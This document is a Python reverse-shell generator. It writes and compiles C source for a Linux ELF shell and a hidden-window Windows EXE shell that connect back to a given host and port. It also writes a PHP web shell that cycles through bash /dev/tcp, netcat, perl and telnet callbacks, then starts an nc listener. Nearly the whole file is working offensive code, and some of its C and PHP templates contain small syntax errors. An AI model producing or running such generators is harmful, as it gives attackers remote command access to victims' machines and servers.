#!/usr/bin/python3

import os
from time import sleep
import sys
import subprocess

class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

banner = """
   ________  __    __    _______   ____     ____    _______   __    _____  ___   
  /"      ")/" |  | "\  /" __   ) /  " \   /  " \  |   _  "\ |" \  ( "   \|"  \  
 (:   //\_/(:  (__)  :)(__/ _) .//__|| |  /__|| |  (. |_)  :)||  | |.\    \    | 
  \___ \    \/      \/     /  //    |: |     |: |  |:     \/ |:  | |: \.   \   | 
  __ |  \   //  __   \  __ \_  \   _\  |    _\  |  (|  _  \  |.  | |.  \    \. | 
 /" \/  :) (:  (  )  :)(: \__) :\ /" \_|\  /" \_|\ |: |_)  :)/\  |\|    \    \ | 
(_______/   \__|  |__/  \_______)(_______)(_______)(_______/(__\_|_)\___|\____\) 
                                                                                 
"""

def init():
    print(bcolors.RED)    
    print(banner)
    print(bcolors.ENDC)
    print(bcolors.GREEN)
    text = "ReverseShell Binary Auto generater in C language\n\n"

    for i in text:
        print(i,end="",flush=True)
        sleep(0.02)

    del text
    print(bcolors.ENDC)
    if len(sys.argv) != 4:
        
        print(bcolors.RED)

        print("[!]More Args!!!!!!")
        print(f"[+]Usage: {sys.argv[0]} <lhost> <lport> <file_type>")
        print(f"[+]Example: {sys.argv[0]} 192.168.0.4 1337 elf")
        print(f"[+]Example: {sys.argv[0]} 192.168.0.4 1337 exe")
        print(bcolors.ENDC)
        
        sys.exit()

def host_and_port():
    lhost = sys.argv[1]
    lport = sys.argv[2]

    array = [lhost,lport]
    counter = 0

    for i in array:
        if len(i) > counter:
            counter = len(i)

    max_length = counter
    hatch = "+"+"-"*counter+"+"
    diff = max_length - len(lport)

    print(hatch)
    print(f"|{lhost}|<---LHOST")
    print(f"|{lport}"+" "*diff+"|<---LPORT")
    print(hatch)

    del array,counter,max_length,hatch,diff

    allow_range = [p for p in range(1,65536)]
    
    print(bcolors.RED)
    if int(lport) not in allow_range:
        print("[!]Invalid Number")
        print("[+]Port number: 1 - 65535")
        
        sys.exit()
    del allow_range
    return lhost,lport
    print(bcolors.ENDC)

def elf_write(lhost,lport):
    
    file_name = "shell.c"
    f = open(file_name,"w")
    f.write("#include <stdlib.h>\n")
    f.write("#include <unistd.h>\n")
    f.write("#include <netinet/in.h>\n")
    f.write("#include <arpa/inet.h>\n\n")
    f.write("int main(void){\n")
    f.write(f"int port = {int(lport)};\n")
    f.write("struct sockaddr_in revsockaddr;\n\n")
    f.write("int sockt = socket(AF_INET, SOCK_STREAM, 0);\n")
    f.write("revsockaddr.sin_family = AF_INET;\n")
    f.write("revsockaddr.sin_port = htons(port);\n")
    f.write(f"revsockaddr.sin_addr.s_addr = inet_addr(\"{lhost}\");\n\n")
    f.write("connect(sockt, (struct sockaddr *) &revsockaddr,\n")
    f.write("sizeof(revsockaddr));\n")
    f.write("dup2(sockt, 0);\n")
    f.write("dup2(sockt, 1);\n")
    f.write("dup2(sockt, 2);\n\n")
    f.write("char * const argv[] = {\"/bin/sh\", NULL};\n")
    f.write("execve(\"/bin/sh\", argv, NULL);\n\n")
    f.write("return 0;\n")
    f.write("}")
    f.close()
    
    print("[+]SourceCode Generated")


    del f
    return file_name


def exe_write(lhost,lport):

    file_name = "shell.c"
    f = open(file_name,"w")
    f.write("#include <stdio.h>\n")
    f.write("#include <stdlib.h>\n")
    f.write("#include <unistd.h>\n")
    f.write("#include <winsock2.h>\n")
    f.write("#include <winuser.h>\n")
    f.write("#include <wininet.h>\n")
    f.write("#include <windowsx.h>\n")
    f.write("#include <string.h>\n")
    f.write("#include <sys/stat.h>\n")
    f.write("#include <sys/types.h>\n\n")

    f.write("#define bzero(p, size) (void)memset((p), 0, (size))\n\n")

    f.write("int sock;\n\n")

    f.write("void Shell()\n")
    f.write("{\n")
    f.write("char buffer[1024];\n")
    f.write("char container[1024];\n")
    f.write("char total_response[18384];\n")
    f.write("while (TRUE)\n")
    f.write("{\n")
    f.write("jump:\n")
    f.write("bzero(buffer, sizeof(buffer));\n")
    f.write("bzero(container, sizeof(container));\n")
    f.write("bzero(total_response, sizeof(total_response));\n")
    f.write("recv(sock, buffer, sizeof(buffer), 0);\n")

    f.write("if (strncmp(\"q\", buffer, 1) == 0)\n")
    f.write("{\n")
    f.write("closesocket(sock);\n")
    f.write("WSACleanup();\n")
    f.write("exit(0);\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{")
    f.write("FILE *fp;\n")
    f.write("fp = _popen(buffer, \"r\");\n")
    f.write("while (fgets(container, 1024, fp) != NULL)\n")
    f.write("{\n")
    f.write("strcat(total_response, container);\n")
    f.write("}\n")
    f.write("send(sock, total_response, sizeof(total_response), 0);\n")
    f.write("fclose(fp);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n\n")

    f.write("int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)\n")
    f.write("{\n")
    f.write("HWND stealth;\n")
    f.write("AllocConsole();\n")
    f.write("stealth = FindWindowA(\"ConsoleWindowClass\", NULL);\n")
    f.write("ShowWindow(stealth, 0);\n")
    f.write("struct sockaddr_in ServAddr;\n")
    f.write("unsigned short ServPort;\n")
    f.write("char *ServIP;\n")
    f.write("WSADATA wsaData;\n")
    f.write(f"ServIP = \"{lhost};\"\n")
    f.write(f"ServPort = {lport};\n")
    f.write("if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)\n")
    f.write("{\n")
    f.write("exit(1);\n")
    f.write("}\n\n")

    f.write("sock = socket(AF_INET, SOCK_STREAM, 0);\n")
    f.write("memset(&ServAddr, 0, sizeof(ServAddr));\n")
    f.write("ServAddr.sin_family = AF_INET;\n")
    f.write("ServAddr.sin_addr.s_addr = inet_addr(ServIP);\n")
    f.write("ServAddr.sin_port = htons(ServPort);\n\n")

    f.write("start:\n")
    f.write("while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)\n")
    f.write("{\n")
    f.write("Sleep(10);\n")
    f.write("goto start;\n")
    f.write("}\n")
    f.write("Shell();i\n")
    f.write("}")

    del f
    return file_name


def php_write(lhost,lport):

    file_name = "shell.php"
    f = open(file_name,"w")
    f.write("<?php\n")
    f.write("echo 'running shell';\n")
    f.write(f"$ip='{lhost}';\n")
    f.write(f"$port='{lport}';\n")
    f.write("$reverse_shells = array(\n")
    f.write("'/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',\n")
    f.write("'0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; /bin/sh <&196 >&196 2>&196',\n")
    f.write("'/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash',\n")
    f.write("'nc.exe -nv '.$ip.' '.$port.' -e cmd.exe',\n")
    f.write("\"/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\\\"\".$ip.\":\".$port.\"\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\",\n")
    f.write("'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p',\n")
    f.write("'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\''\n")
    f.write(");\n")
    f.write("foreach ($reverse_shells as $reverse_shell) {\n")
    f.write("try {echo system($reverse_shell);} catch (Exception $e) {echo $e;}\n")
    f.write("try {shell_exec($reverse_shell);} catch (Exception $e) {echo $e;}\n")
    f.write("try {exec($reverse_shell);} catch (Exception $e) {echo $e;}\n")
    f.write("}\n")
    f.write("system('id');\n")
    f.write("?>\n")
 
    del f

    return file_name

def format_setting():

    file_type = sys.argv[3]
    
    if file_type == "elf":

        f_format = "elf"
        
    elif file_type == "exe":

        f_format = "exe"

    elif file_type == "php":

        f_format = "php"

    else:

        print("[!]Invalid Value")
        print(bcolors.ENDC)
        print("Valid: \"elf\" or \"exe\"")
        sys.exit()
    
    
    return f_format

def compile(file_name,f_format):

    if f_format == "elf":

        try:
            compile_cmd = subprocess.getoutput(f"gcc {file_name} -o shell ")
        
            if "not found" in compile_cmd:
                print("[!]Could not Use gcc")
                print(bcolors.ENDC)
                sys.exit()    

        except:
            print("[!]Execption Occured")
            print(bcolors.ENDC)
            sys.exit()

    elif f_format == "exe":

        try:
            compile_cmd = subprocess.getoutput(f"i686-w64-mingw32-g++ {file_name} -o shell.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")

            if "not found" in compile_cmd:
                print("[!]Could not Use mingw")
                print(bcolors.ENDC)
                sys.exit()
        except:
            print("[!]Exception Occured")
            sys.exit()

    if f_format == "php":

        print(f"{file_name} ---> generated")

    print("[+]Compile....Done")
    print(bcolors.ENDC)

def listener(lport):
    os.system(f"nc -lnvp {lport}")


if __name__ == "__main__":

    init()
    lhost,lport = host_and_port()
    f_format = format_setting()

    if f_format == "elf":
        file_name = elf_write(lhost,lport) 

    elif f_format == "exe":
        file_name = exe_write(lhost,lport)

    elif f_format == "php":
        file_name = php_write(lhost,lport)

    compile(file_name,f_format)
    listener(lport)
